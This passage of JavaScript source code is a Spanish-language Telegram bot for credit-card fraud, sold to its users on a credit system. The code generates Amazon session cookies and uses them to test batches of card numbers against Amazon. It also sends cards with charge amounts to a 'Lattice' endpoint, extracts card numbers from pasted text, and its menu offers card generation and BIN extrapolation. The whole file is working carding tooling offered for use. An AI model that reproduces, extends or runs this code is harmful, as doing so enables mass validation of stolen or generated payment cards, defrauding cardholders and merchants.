        await sendSafeMessage(chatId, resumen);
        
    } catch (error) {
        console.error('Error en /amazon:', error);
        await sendSafeMessage(chatId, `❌ Error: ${error.message}`);
    }
    clearUserState(telegramId);
});

// ========== COMANDO /AMAZONCOOKIE (igual pero genera cookie primero) ==========
const amazonCookieRegex = /^\/(?:amazoncookie|amazoncuki|amazonck|amzck)(?:\s+(.+))?/i;
bot.onText(amazonCookieRegex, async (msg, match) => {
    const chatId = msg.chat.id;
    const telegramId = msg.from.id;
    // Forzar generación de cookie nueva
    await sendSafeMessage(chatId, '🍪 Generando nueva cookie antes de verificar...');
    try {
        const response = await fetch(`${API_GENCOOKIE_URL}/generate`, {
            method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ country: 'MX', add_address: true })
        });
        const data = await response.json();
        if (!data.success) throw new Error('No se pudo generar cookie');
        const cookie = data.data.cookie_string;
        await updateUserCookie(telegramId, cookie);
        const creditResult = await deductCredits(telegramId, 4);
        if (!creditResult) throw new Error('Fallo en descuento');
        await sendSafeMessage(chatId, `✅ Cookie generada (créditos restantes: ${creditResult.newCredits}). Ahora verificando...`);
        // Llamar a la lógica de amazon reutilizando la cookie
        // Simplemente ejecutamos /amazon con el mismo input
        const fakeMsg = { chat: { id: chatId }, from: { id: telegramId }, text: match[0] + ' ' + (match[1] || '') };
        bot.emit('text', fakeMsg); // Reutilizar el comando amazon
    } catch (err) {
        await sendSafeMessage(chatId, `❌ Error: ${err.message}`);
    }
});

// ========== COMANDO /LATTICE ==========
const latticeRegex = /^\/(?:lattice)(?:\s+(.+))?/i;
bot.onText(latticeRegex, async (msg, match) => {
    const chatId = msg.chat.id;
    const telegramId = msg.from.id;
    let amount = match[1];
    
    if (!amount) {
        setUserState(telegramId, { step: 'awaiting_lattice_amount' });
        return sendSafeMessage(chatId, '💰 Ingresa el monto para el charged (ej. 19.99):');
    }
    
    if (!await checkAndKickIfNoDaysOrCredits(telegramId, chatId, 1)) return;
    
    // Obtener tarjetas (similar a amazon, pero con monto)
    setUserState(telegramId, { step: 'awaiting_lattice_cards', data: { amount } });
    await sendSafeMessage(chatId, '💳 Envía las tarjetas (texto sucio o patrón extra):');
});

// Manejo de estados interactivos para lattice
// (Simplificado: se puede extender igual que amazon)

// ========== MANEJO DE RESPUESTAS A MENSAJES PREVIOS ==========
bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const telegramId = msg.from.id;
    const state = userStates.get(telegramId);
    if (!state || !state.step) return;
    
    // Si el mensaje es un comando, no interferir
    if (msg.text?.startsWith('/')) return;
    
    // Si el usuario respondió a un mensaje del bot, usar ese texto como dato
    let inputText = msg.text;
    if (msg.reply_to_message && msg.reply_to_message.from.id === bot.botInfo.id) {
        inputText = msg.reply_to_message.text + ' ' + msg.text; // concatenar?
        // Mejor usar solo el texto del reply como referencia
    }
    
    switch (state.step) {
        case 'awaiting_binlist_query':
            // Reenviar a binlist
            bot.emit('text', { ...msg, text: `/binlist ${inputText}` });
            clearUserState(telegramId);
            break;
        case 'awaiting_extrapolador_input':
            bot.emit('text', { ...msg, text: `/extrapolador ${inputText}` });
            clearUserState(telegramId);
            break;
        case 'awaiting_gen_param':
            bot.emit('text', { ...msg, text: `/gen ${inputText}` });
            clearUserState(telegramId);
            break;
        case 'awaiting_gencookie_country':
            bot.emit('text', { ...msg, text: `/gencookie ${inputText}` });
            clearUserState(telegramId);
            break;
        case 'awaiting_setcookie':
            bot.emit('text', { ...msg, text: `/setcookie ${inputText}` });
            clearUserState(telegramId);
            break;
        case 'awaiting_amazon_cards':
            bot.emit('text', { ...msg, text: `/amazon ${inputText}` });
            clearUserState(telegramId);
            break;
        case 'awaiting_lattice_amount':
            bot.emit('text', { ...msg, text: `/lattice ${inputText}` });
            clearUserState(telegramId);
            break;
        case 'awaiting_lattice_cards':
            // Procesar lattice con amount guardado
            const amount = state.data.amount;
            const tarjetas = limpiarTarjetas(inputText);
            if (tarjetas.length === 0) return sendSafeMessage(chatId, '❌ No se encontraron tarjetas válidas.');
            await sendSafeMessage(chatId, `🔍 Verificando ${tarjetas.length} tarjetas con Lattice (monto $${amount})...`);
            // Llamar a API de Lattice
            try {
                const resultados = [];
                for (const card of tarjetas.slice(0, 10)) {
                    const response = await fetch(API_LATTICE_URL, {
                        method: 'POST', headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ card, amount })
                    });
                    const data = await response.json();
                    resultados.push({ card, status: data.status });
                }
                const separador = SEPARATORS[Math.floor(Math.random() * SEPARATORS.length)];
                let resumen = `${separador}\n`;
                for (const r of resultados) {
                    resumen += `• Card: ${r.card}\n• Status: ${r.status}\n${separador}\n`;
                }
                await sendSafeMessage(chatId, resumen);
                await deductCredits(telegramId, 1);
            } catch (err) {
                await sendSafeMessage(chatId, `❌ Error: ${err.message}`);
            }
            clearUserState(telegramId);
            break;
        default:
            break;
    }
});

// ========== MANEJO DE CALLBACK QUERY ==========
bot.on('callback_query', async (callbackQuery) => {
    const msg = callbackQuery.message;
    const chatId = msg.chat.id;
    const telegramId = callbackQuery.from.id;
    const data = callbackQuery.data;
    
    if (data === 'gencookie_for_amazon') {
        // Generar cookie y luego continuar con amazon
        try {
            const response = await fetch(`${API_GENCOOKIE_URL}/generate`, {
                method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ country: 'MX', add_address: true })
            });
            const json = await response.json();
            if (!json.success) throw new Error('Error generando cookie');
            const cookie = json.data.cookie_string;
            await updateUserCookie(telegramId, cookie);
            const creditResult = await deductCredits(telegramId, 4);
            if (!creditResult) throw new Error('Sin créditos');
            await sendSafeMessage(chatId, `✅ Cookie generada. Créditos restantes: ${creditResult.newCredits}\nAhora envía las tarjetas para verificar:`);
            setUserState(telegramId, { step: 'awaiting_amazon_cards' });
        } catch (err) {
            await sendSafeMessage(chatId, `❌ Error: ${err.message}`);
        }
        await bot.answerCallbackQuery(callbackQuery.id);
    }
});

// ========== COMANDOS DE AYUDA Y MENÚ ==========
bot.onText(/\/menu/, async (msg) => {
    const opts = {
        reply_markup: {
            inline_keyboard: [
                [{ text: '🍪 Generar Cookie', callback_data: 'menu_gencookie' }],
                [{ text: '🔍 Extrapolador', callback_data: 'menu_extrapolador' }],
                [{ text: '🎴 Generar Tarjetas', callback_data: 'menu_gen' }],
                [{ text: '🧹 Limpiador', callback_data: 'menu_limpiador' }],
                [{ text: '🔍 Verificar Amazon', callback_data: 'menu_chk' }],
                [{ text: '💰 Créditos', callback_data: 'menu_creditos' }]
            ]
        }
    };
    await sendSafeMessage(msg.chat.id, '📋 *Menú principal*', { parse_mode: 'Markdown', ...opts });
});

bot.onText(/\/help/, async (msg) => {
    await sendSafeMessage(msg.chat.id,
        `📖 *Comandos disponibles:*\n` +
        `/start - Vincular cuenta\n` +
        `/gencookie [país] - Generar cookie (4 créditos)\n` +
        `/setcookie [cookie] - Guardar cookie\n` +
        `/binlist [banco/pais] - Listar bins\n` +
        `/extrapolador [bin|banco] - Extrapolar patrones (10 créditos)\n` +
        `/gen [extra|bin|banco] - Generar tarjetas (4 créditos)\n` +
        `/amazon [extra|bin|tarjetas] - Verificar en Amazon (usa cookie guardada)\n` +
        `/amazoncookie - Igual pero genera cookie nueva\n` +
        `/lattice [monto] - Verificar con Lattice\n` +
        `/limpiador - Limpiar texto sucio\n` +
        `/creditos - Ver saldo\n` +
        `/menu - Menú interactivo`, { parse_mode: 'Markdown' });
});

bot.onText(/\/creditos|\/credits|\/saldo/, async (msg) => {
    const user = await getUserByTelegramId(msg.from.id);
    if (!user) return sendSafeMessage(msg.chat.id, '❌ Usa /start primero.');
    await sendSafeMessage(msg.chat.id, `💰 *Créditos:* ${user.credits}\n📅 *Días:* ${user.days_remaining}`, { parse_mode: 'Markdown' });
});

bot.onText(/\/limpiador(?:\s+(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    let texto = match[1];
    if (!texto) {
        setUserState(msg.from.id, { step: 'awaiting_limpiador' });
        return sendSafeMessage(chatId, '📝 Envía el texto sucio con tarjetas:');
    }
    const tarjetas = limpiarTarjetas(texto);
    if (tarjetas.length === 0) return sendSafeMessage(chatId, '❌ No se encontraron tarjetas.');
    const lista = tarjetas.slice(0, 30).map(t => `\`${t}\``).join('\n');
    await sendSafeMessage(chatId, `🔍 *Tarjetas encontradas (${tarjetas.length}):*\n${lista}`, { parse_mode: 'Markdown' });
    clearUserState(msg.from.id);
});

console.log('✅ Bot mejorado listo');